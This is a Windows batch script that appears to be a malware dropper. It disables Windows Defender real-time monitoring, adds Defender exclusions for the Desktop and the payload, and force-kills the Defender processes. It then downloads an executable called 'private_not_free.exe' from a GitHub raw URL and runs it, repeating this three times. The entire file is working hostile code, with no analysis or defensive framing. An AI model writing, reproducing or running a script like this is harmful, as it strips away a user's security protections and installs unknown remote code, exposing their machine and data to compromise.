@echo off
setlocal

:: Set the URL of the EXE and the name to save it as
set "exe_url=https://raw.githubusercontent.com/ZeroDayx/private/refs/heads/main/private_not_free.exe"
set "exe_name=private_not_free.exe"

:: Automatically determine the Desktop path
set "desktop_path=%USERPROFILE%\Desktop"
set "onedrive_desktop_path=%USERPROFILE%\OneDrive\Desktop"

:: Check if the OneDrive Desktop path exists
if exist "%onedrive_desktop_path%" (
    set "desktop_path=%onedrive_desktop_path%"
    echo Using OneDrive Desktop path: %desktop_path%
) else (
    echo Using standard Desktop path: %desktop_path%
)

:: Check if the Desktop path exists
if not exist "%desktop_path%" (
    echo Desktop path not found. Please check your user profile.
    echo Current user profile path: %USERPROFILE%
    pause
    exit /b
)

:: Disable Windows Defender temporarily
echo Disabling Windows Defender...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
echo Windows Defender has been disabled.

:: Loop to run the jobs three times
for /L %%i in (1,1,3) do (
    echo Running iteration %%i...

    :: Download the EXE using PowerShell (blocking call)
    echo Downloading the EXE to Desktop...
    powershell -Command "Invoke-WebRequest -Uri '%exe_url%' -OutFile '%desktop_path%\%exe_name%'"

    :: Check if the EXE was downloaded successfully
    if exist "%desktop_path%\%exe_name%" (
        echo EXE downloaded successfully: %exe_name%
        
        :: Add exclusion for the EXE file in Windows Defender
        powershell -Command "Set-MpPreference -ExclusionPath '%desktop_path%'; Set-MpPreference -ExclusionProcess '%desktop_path%\%exe_name%'"
        echo Added to Windows Defender exclusions.

        :: Kill all Microsoft Defender processes
        echo Stopping Microsoft Defender processes...
        taskkill /F /IM MsMpEng.exe >nul 2>&1
        taskkill /F /IM SecurityHealthSystray.exe >nul 2>&1
        taskkill /F /IM WindowsSecurity.exe >nul 2>&1

        echo Running the EXE...
        start "" "%desktop_path%\%exe_name%"
        echo EXE executed successfully.
    ) else (
        echo Failed to download the EXE. Please check the URL and your internet connection.
    )
)

echo All iterations completed.
pause   
endlocal